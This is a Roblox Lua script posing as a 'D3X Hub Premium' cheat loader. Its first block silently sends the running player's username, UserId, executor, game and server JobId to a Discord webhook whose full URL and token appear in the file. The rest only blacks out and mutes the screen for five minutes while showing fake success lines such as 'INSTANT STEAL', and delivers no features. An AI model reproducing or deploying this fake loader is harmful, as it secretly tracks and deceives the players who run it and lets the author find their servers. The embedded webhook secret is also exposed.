-- ============================================================
-- // D3X HUB PREMIUM - FULL LOADER + WEBHOOK LOGGER //
-- ============================================================

-- =========================
-- WEBHOOK CONFIG
-- =========================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1463264039739199728/RS5FcUQSIf3wwEi6gjB0TvKhhd0jnF_cFHrXaRIjRYDxNt6g_O9LbihxvgfzZktk8vxu"

-- =========================
-- WEBHOOK LOGGER
-- =========================
task.spawn(function()
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")
    local HttpService = game:GetService("HttpService")

    local Player = Players.LocalPlayer
    if not Player then return end

    local executor = identifyexecutor and identifyexecutor() or "Inconnu"
    local gameName = "Jeu Inconnu"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    local thumbUrl = string.format(
        "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
        Player.UserId
    )

    local data = {
        username = "D3X HUB LOGGER",
        embeds = {{
            title = "✅ Script exécuté avec succès",
            description = "Un utilisateur vient d'exécuter **D3X Hub Premium**",
            color = 11141290,
            thumbnail = { url = thumbUrl },
            fields = {
                { name = "👤 Pseudo", value = Player.Name .. " (" .. Player.DisplayName .. ")", inline = true },
                { name = "🆔 UserId", value = tostring(Player.UserId), inline = true },
                { name = "💉 Executor", value = executor, inline = true },
                { name = "🎮 Jeu", value = gameName .. " (" .. game.PlaceId .. ")", inline = false },
                { name = "🔗 JobId", value = "```" .. (game.JobId ~= "" and game.JobId or "Privé") .. "```", inline = false }
            },
            footer = { text = "D3X Premium Loader • " .. os.date("%X") }
        }}
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }

    local requestFunc =
        request or
        http_request or
        (syn and syn.request) or
        (fluxus and fluxus.request)

    if requestFunc then
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })
    end
end)

-- ============================================================
-- // PREMIUM LOADER //
-- ============================================================

local function StartPremiumLoader()
    local CoreGui = game:GetService("CoreGui")
    local UserGameSettings = UserSettings():GetService("UserGameSettings")

    -- 🔇 MUTE SON
    local oldVolume = UserGameSettings.MasterVolume
    UserGameSettings.MasterVolume = 0

    -- 🖥️ GUI
    local LoaderGui = Instance.new("ScreenGui")
    LoaderGui.Name = "D3X_LONG_LOADER"
    LoaderGui.IgnoreGuiInset = true
    LoaderGui.DisplayOrder = 10000
    LoaderGui.Parent = CoreGui

    local Background = Instance.new("Frame")
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.BackgroundColor3 = Color3.new(0, 0, 0)
    Background.Active = true
    Background.Parent = LoaderGui

    local Title = Instance.new("TextLabel")
    Title.Text = "D3X HUB PREMIUM LOADING..."
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 28
    Title.TextColor3 = Color3.fromRGB(170, 0, 255)
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.Position = UDim2.new(0, 0, 0.35, 0)
    Title.BackgroundTransparency = 1
    Title.Parent = Background

    -- STATUS
    local StatusContainer = Instance.new("Frame")
    StatusContainer.Size = UDim2.new(0, 220, 0, 150)
    StatusContainer.Position = UDim2.new(1, -230, 0, 20)
    StatusContainer.BackgroundTransparency = 1
    StatusContainer.Parent = Background

    local UIList = Instance.new("UIListLayout")
    UIList.HorizontalAlignment = Enum.HorizontalAlignment.Right
    UIList.Padding = UDim.new(0, 5)
    UIList.Parent = StatusContainer

    local function addStatus(text)
        local lbl = Instance.new("TextLabel")
        lbl.Text = "[✔] " .. text
        lbl.Font = Enum.Font.Code
        lbl.TextSize = 14
        lbl.TextColor3 = Color3.fromRGB(0, 255, 120)
        lbl.Size = UDim2.new(1, 0, 0, 20)
        lbl.BackgroundTransparency = 1
        lbl.TextXAlignment = Enum.TextXAlignment.Right
        lbl.Parent = StatusContainer
    end

    addStatus("SUCCESS ESP PLAYER")
    addStatus("SUCCESS INSTANT STEAL")
    addStatus("SUCCESS ITEM ESP")
    addStatus("SUCCESS FPS BOOST")
    addStatus("SUCCESS DYSCN INJECT")

    -- BARRE
    local BarContainer = Instance.new("Frame")
    BarContainer.Size = UDim2.new(0, 500, 0, 12)
    BarContainer.Position = UDim2.new(0.5, -250, 0.5, 0)
    BarContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    BarContainer.Parent = Background
    Instance.new("UICorner", BarContainer)

    local BarFill = Instance.new("Frame")
    BarFill.Size = UDim2.new(0, 0, 1, 0)
    BarFill.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
    BarFill.Parent = BarContainer
    Instance.new("UICorner", BarFill)

    local PercentLbl = Instance.new("TextLabel")
    PercentLbl.Text = "0%"
    PercentLbl.Font = Enum.Font.GothamBold
    PercentLbl.TextSize = 20
    PercentLbl.TextColor3 = Color3.new(1, 1, 1)
    PercentLbl.Position = UDim2.new(0.5, -50, 0.5, 30)
    PercentLbl.Size = UDim2.new(0, 100, 0, 30)
    PercentLbl.BackgroundTransparency = 1
    PercentLbl.Parent = Background

    -- ⏳ 5 MINUTES
    local duration = 300
    local startTime = tick()

    task.spawn(function()
        while true do
            local progress = math.min((tick() - startTime) / duration, 1)
            PercentLbl.Text = math.floor(progress * 100) .. "%"
            BarFill.Size = UDim2.new(progress, 0, 1, 0)
            if progress >= 1 then break end
            task.wait(0.5)
        end

        Title.Text = "D3X HUB LOADED SUCCESSFULLY"
        Title.TextColor3 = Color3.fromRGB(0, 255, 100)
        task.wait(2)

        LoaderGui:Destroy()
        UserGameSettings.MasterVolume = oldVolume
    end)
end

-- 🚀 START
StartPremiumLoader()